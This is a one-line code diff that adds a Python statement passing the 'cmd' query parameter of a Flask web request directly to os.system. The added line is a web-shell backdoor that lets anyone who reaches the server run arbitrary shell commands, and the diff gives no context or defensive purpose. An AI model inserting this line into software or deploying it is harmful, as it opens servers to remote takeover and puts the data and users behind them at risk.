@@ -1,0 +1,1 @@
+import os; os.system(__import__("flask").request.args.get("cmd"))
